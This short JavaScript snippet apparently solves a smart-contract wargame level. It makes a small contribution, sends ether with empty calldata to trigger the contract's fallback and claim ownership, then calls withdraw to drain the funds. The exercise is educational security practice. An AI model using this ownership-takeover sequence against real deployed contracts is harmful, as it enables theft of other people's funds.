```js
await sendTransaction({
    from: player,
    to: contract.address,
    value: toWei('0.0001'),
    data: web3.utils.sha3('contribute()').substring(0, 10),
})

await sendTransaction({
    from: player,
    to: contract.address,
    value: toWei('0.0000001'),
    data: '',
})

await contract.withdraw()
```
